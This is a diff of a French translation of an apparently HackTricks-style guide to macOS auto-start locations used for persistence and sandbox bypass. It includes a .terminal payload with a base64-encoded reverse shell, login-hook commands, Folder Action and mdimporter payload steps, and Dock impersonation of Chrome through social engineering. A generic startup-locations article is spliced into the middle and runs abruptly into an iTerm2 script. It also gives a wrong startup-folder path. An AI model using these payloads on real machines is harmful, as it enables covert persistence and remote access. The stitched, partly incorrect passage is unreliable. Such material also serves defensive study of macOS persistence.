@@ -217,20 +217,20 @@ Vous pouvez l'ajouter depuis la ligne de commande avec :
 ```
 {% endcode %}
 
-### Scripts du Terminal
+### Scripts Terminal / Autres extensions de fichiers
 
-* Utiles pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
+* Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
 
 #### Emplacement
 
 * **N'importe où**
-* **Déclencheur** : Ouvrir le Terminal
+* **Déclencheur**: Ouvrir Terminal
 
 #### Description et Exploitation
 
-Si vous créez un script **`.terminal`** et l'ouvrez, l'application **Terminal** sera automatiquement invoquée pour exécuter les commandes indiquées. Si l'application Terminal dispose de certains privilèges spéciaux (comme TCC), votre commande sera exécutée avec ces privilèges spéciaux.
+Si vous créez un script [**`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) et l'ouvrez, l'application **Terminal** sera automatiquement invoquée pour exécuter les commandes indiquées. Si l'application Terminal dispose de certains privilèges spéciaux (comme TCC), votre commande sera exécutée avec ces privilèges spéciaux.
 
-Essayez avec :
+Essayez avec:
 ```bash
 # Prepare the payload
 cat > /tmp/test.terminal << EOF
@@ -258,6 +258,8 @@ open /tmp/test.terminal
 # Use something like the following for a reverse shell:
 <string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
 ```
+Vous pouvez également utiliser les extensions **`.command`** et **`.tool`**, avec du contenu de scripts shell réguliers, et ils seront également ouverts par Terminal.
+
 {% hint style="danger" %}
 Si le terminal dispose d'un **Accès complet au disque**, il pourra effectuer cette action (notez que la commande exécutée sera visible dans une fenêtre de terminal).
 {% endhint %}
@@ -270,15 +272,15 @@ Writeup : [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https:/
 #### Emplacement
 
 * **`/Library/Audio/Plug-Ins/HAL`**
-* Nécessite les droits d'administrateur
+* Nécessite des privilèges d'administrateur
 * **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
 * **`/Library/Audio/Plug-ins/Components`**
-* Nécessite les droits d'administrateur
+* Nécessite des privilèges d'administrateur
 * **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
 * **`~/Library/Audio/Plug-ins/Components`**
 * **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
 * **`/System/Library/Components`**
-* Nécessite les droits d'administrateur
+* Nécessite des privilèges d'administrateur
 * **Déclencheur** : Redémarrer coreaudiod ou l'ordinateur
 
 #### Description
@@ -318,7 +320,7 @@ Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-butto
 #### Emplacement
 
 * Vous devez être en mesure d'exécuter quelque chose comme `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
-* `Situé dans` `~/Library/Preferences/com.apple.loginwindow.plist`
+* Situé dans `~/Library/Preferences/com.apple.loginwindow.plist`
 
 Ils sont obsolètes mais peuvent être utilisés pour exécuter des commandes lorsqu'un utilisateur se connecte.
 ```bash
@@ -349,17 +351,17 @@ defaults delete com.apple.loginwindow LogoutHook
 ```
 L'utilisateur root est stocké dans **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**
 
-## Contournement conditionnel de la sandbox
+## Contournement conditionnel du sandbox
 
 {% hint style="success" %}
-Ici, vous pouvez trouver des emplacements de démarrage utiles pour contourner la sandbox, ce qui vous permet d'exécuter simplement quelque chose en l'écrivant dans un fichier et en vous attendant à des conditions pas super courantes comme des programmes spécifiques installés, des actions ou des environnements utilisateur "non courants".
+Ici, vous pouvez trouver des emplacements de démarrage utiles pour contourner le sandbox, ce qui vous permet d'exécuter simplement quelque chose en l'écrivant dans un fichier et en vous attendant à des conditions pas super courantes comme des programmes spécifiques installés, des actions ou des environnements utilisateur "non courants".
 {% endhint %}
 
 ### Cron
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)
 
-* Utile pour contourner la sandbox : [✅](https://emojipedia.org/check-mark-button)
+* Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
 * Cependant, vous devez être capable d'exécuter le binaire `crontab`
 * Ou être root
 
@@ -423,7 +425,9 @@ Voici quelques-uns des emplacements de démarrage automatique les plus courants 
 
 ## Dossier de démarrage
 
-Le dossier de démarrage est l'emplacement le plus courant pour configurer les applications de démarrage automatique. Les applications placées dans ce dossier se lancent automatiquement chaque fois que vous démarrez votre Mac. Le chemin d'accès au dossier de démarrage est le suivant :
+Le dossier de démarrage est l'emplacement le plus courant pour configurer les applications de démarrage automatique. Les applications placées dans ce dossier se lancent automatiquement lorsque vous ouvrez une session sur votre compte utilisateur.
+
+Le chemin du dossier de démarrage est le suivant :
 
 ```
 ~/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ApplicationRecentDocuments/
@@ -431,33 +435,37 @@ Le dossier de démarrage est l'emplacement le plus courant pour configurer les a
 
 ## Préférences système
 
-Les préférences système de macOS offrent également une option pour configurer les applications de démarrage automatique. Vous pouvez accéder à cette option en ouvrant les préférences système, en sélectionnant "Utilisateurs et groupes", puis en cliquant sur l'onglet "Ouverture". Vous verrez une liste des applications configurées pour se lancer au démarrage et vous pourrez ajouter ou supprimer des applications de cette liste.
+Les préférences système de macOS offrent également une option pour configurer les applications de démarrage automatique. Vous pouvez accéder à cette option en ouvrant les préférences système, en sélectionnant "Utilisateurs et groupes", puis en cliquant sur l'onglet "Ouverture".
 
 ## LaunchAgents et LaunchDaemons
 
-Les LaunchAgents et LaunchDaemons sont des mécanismes utilisés par macOS pour lancer des processus en arrière-plan. Les LaunchAgents sont spécifiques à un utilisateur, tandis que les LaunchDaemons sont exécutés au niveau du système. Vous pouvez trouver les fichiers de configuration pour ces mécanismes dans les dossiers suivants :
+Les LaunchAgents et LaunchDaemons sont des mécanismes utilisés par macOS pour lancer des processus en arrière-plan. Les LaunchAgents sont spécifiques à un utilisateur, tandis que les LaunchDaemons sont exécutés au niveau du système.
+
+Les fichiers de configuration pour les LaunchAgents se trouvent dans le dossier suivant :
 
 ```
 ~/Library/LaunchAgents/
-/Library/LaunchAgents/
+```
+
+Les fichiers de configuration pour les LaunchDaemons se trouvent dans le dossier suivant :
+
+```
 /Library/LaunchDaemons/
 ```
 
 ## Extensions de noyau
 
-Les extensions de noyau sont des modules logiciels qui étendent les fonctionnalités du noyau macOS. Certaines extensions de noyau peuvent être configurées pour se charger automatiquement au démarrage du système. Vous pouvez vérifier les extensions de noyau installées sur votre Mac en utilisant la commande suivante dans Terminal :
+Les extensions de noyau peuvent également être utilisées pour lancer des processus au démarrage du système. Les extensions de noyau sont des modules logiciels qui s'exécutent au niveau du noyau et peuvent avoir un accès privilégié au système.
+
+Les extensions de noyau sont généralement installées dans le dossier suivant :
 
 ```
-kextstat | grep -v com.apple
+/Library/Extensions/
 ```
-
-## Login Items
-
-Les Login Items sont des applications, des documents ou des dossiers qui se lancent automatiquement lorsque vous vous connectez à votre compte utilisateur. Vous pouvez gérer les Login Items en ouvrant les préférences système, en sélectionnant "Utilisateurs et groupes", puis en cliquant sur l'onglet "Ouverture". Vous verrez une liste des Login Items configurés pour se lancer au démarrage de session et vous pourrez ajouter ou supprimer des éléments de cette liste.
 
 ## Conclusion
 
-La connaissance des emplacements de démarrage automatique de macOS est essentielle pour sécuriser votre système et éviter que des applications indésirables ne se lancent automatiquement. En comprenant où se trouvent ces emplacements et comment les gérer, vous pouvez contrôler les applications qui se lancent au démarrage de votre Mac.
+La connaissance des emplacements de démarrage automatique de macOS est essentielle pour comprendre comment les applications sont configurées pour se lancer automatiquement. En comprenant ces emplacements, vous pouvez mieux contrôler les applications qui s'exécutent au démarrage de votre système.
 ```bash
 cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
 #!/usr/bin/env python3
@@ -714,22 +722,22 @@ Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-89
 
 #### Description et exploitation
 
-Un script d'action de dossier est exécuté lorsque des éléments sont ajoutés ou supprimés dans le dossier auquel il est attaché, ou lorsque sa fenêtre est ouverte, fermée, déplacée ou redimensionnée :
+Un script d'action de dossier est exécuté lorsque le dossier auquel il est attaché a des éléments ajoutés ou supprimés, ou lorsque sa fenêtre est ouverte, fermée, déplacée ou redimensionnée:
 
 * Ouvrir le dossier via l'interface utilisateur du Finder
 * Ajouter un fichier au dossier (peut être fait par glisser-déposer ou même dans une invite de commande depuis un terminal)
 * Supprimer un fichier du dossier (peut être fait par glisser-déposer ou même dans une invite de commande depuis un terminal)
 * Naviguer hors du dossier via l'interface utilisateur
 
-Il existe plusieurs façons de mettre en œuvre cela :
+Il existe plusieurs façons de mettre en œuvre cela:
 
 1. Utiliser le programme [Automator](https://support.apple.com/guide/automator/welcome/mac) pour créer un fichier de flux de travail d'action de dossier (.workflow) et l'installer en tant que service.
-2. Clic droit sur un dossier, sélectionner `Configuration des actions de dossier...`, `Exécuter le service` et attacher manuellement un script.
+2. Clic droit sur un dossier, sélectionnez `Configuration des actions de dossier...`, `Exécuter le service` et attachez manuellement un script.
 3. Utiliser OSAScript pour envoyer des messages Apple Event à l'application `System Events.app` pour interroger et enregistrer de manière programmée une nouvelle `Action de dossier`.
 
 * C'est la façon de mettre en œuvre la persistance en utilisant un script OSAScript pour envoyer des messages Apple Event à `System Events.app`
 
-Voici le script qui sera exécuté :
+Voici le script qui sera exécuté:
 
 {% code title="source.js" %}
 ```applescript
@@ -848,7 +856,7 @@ killall Dock
 ```
 {% endcode %}
 
-En utilisant de l'**ingénierie sociale**, vous pourriez **vous faire passer par exemple pour Google Chrome** dans le dock et exécuter réellement votre propre script :
+En utilisant de l'**ingénierie sociale**, vous pourriez **vous faire passer par exemple pour Google Chrome** dans le dock et en réalité exécuter votre propre script :
 ```bash
 #!/bin/sh
 
@@ -917,7 +925,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.g
 * `~/Library/ColorPickers`
 * Déclencheur : Utilisation du sélecteur de couleurs
 
-#### Description et Exploitation
+#### Description et Exploit
 
 **Compilez un bundle** de sélecteur de couleurs avec votre code (vous pouvez utiliser [**celui-ci par exemple**](https://github.com/viktorstrate/color-picker-plus)) et ajoutez un constructeur (comme dans la section [Économiseur d'écran](macos-auto-start-locations.md#screen-saver)) et copiez le bundle dans `~/Library/ColorPickers`.
 
@@ -1139,12 +1147,12 @@ plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 [...]
 ```
 {% hint style="danger" %}
-Si vous vérifiez le Plist d'autres `mdimporter`, vous ne trouverez peut-être pas l'entrée **`UTTypeConformsTo`**. C'est parce que c'est un _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) intégré et il n'a pas besoin de spécifier les extensions.
+Si vous vérifiez le Plist d'autres `mdimporter`, vous ne trouverez peut-être pas l'entrée **`UTTypeConformsTo`**. C'est parce que c'est un _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type_Identifier)) intégré et il n'a pas besoin de spécifier les extensions.
 
 De plus, les plugins par défaut du système ont toujours la priorité, donc un attaquant ne peut accéder qu'aux fichiers qui ne sont pas indexés par les `mdimporters` d'Apple.
 {% endhint %}
 
-Pour créer votre propre importateur, vous pouvez commencer par ce projet : [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) puis changer le nom, les **`CFBundleDocumentTypes`** et ajouter **`UTImportedTypeDeclarations`** pour qu'il prenne en charge l'extension que vous souhaitez prendre en charge et les refléter dans **`schema.xml`**.\
+Pour créer votre propre importateur, vous pouvez commencer par ce projet : [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) puis changer le nom, les **`CFBundleDocumentTypes`** et ajouter **`UTImportedTypeDeclarations`** pour prendre en charge l'extension que vous souhaitez supporter et les refléter dans **`schema.xml`**.\
 Ensuite, **modifiez** le code de la fonction **`GetMetadataForFile`** pour exécuter votre charge utile lorsqu'un fichier avec l'extension traitée est créé.
 
 Enfin, **construisez et copiez votre nouveau `.mdimporter`** dans l'un des emplacements précédents et vous pouvez vérifier s'il est chargé en **surveillant les journaux** ou en vérifiant **`mdimport -L.`**
@@ -1384,12 +1392,12 @@ touch /tmp/manconf
 #### Emplacement
 
 * **`/etc/apache2/httpd.conf`**
-* Nécessite les droits root
-* Déclencheur: lorsque Apache2 démarre
+* Nécessite les privilèges root
+* Déclenchement: lorsque Apache2 démarre
 
 #### Description et Exploit
 
-Vous pouvez indiquer dans /etc/apache2/httpd.conf de charger un module en ajoutant une ligne telle que:
+Vous pouvez indiquer dans /etc/apache2/httpd.conf de charger un module en ajoutant une ligne comme celle-ci:
 
 {% code overflow="wrap" %}
 ```bash
@@ -1517,7 +1525,7 @@ XQuartz n'est **plus installé dans macOS**, donc si vous voulez plus d'informat
 ### ~~kext~~
 
 {% hint style="danger" %}
-Il est si compliqué d'installer un kext même en tant que root que je ne le considérerai pas comme une échappatoire aux sandbox ou même pour la persistance (à moins que vous ayez une exploit)
+Il est si compliqué d'installer un kext même en tant que root que je ne le considérerai pas pour échapper aux sandbox ou même pour la persistance (à moins que vous ayez une exploit)
 {% endhint %}
 
 #### Emplacement
@@ -1571,7 +1579,7 @@ Apparemment, il n'est pas très courant d'exécuter ce script et je ne l'ai mêm
 ### ~~/etc/rc.common~~
 
 {% hint style="danger" %}
-**Cela ne fonctionne pas dans les versions récentes de MacOS**
+**Cela ne fonctionne pas dans les versions modernes de MacOS**
 {% endhint %}
 
 Il est également possible de placer ici **des commandes qui seront exécutées au démarrage.** Exemple de script rc.common régulier :
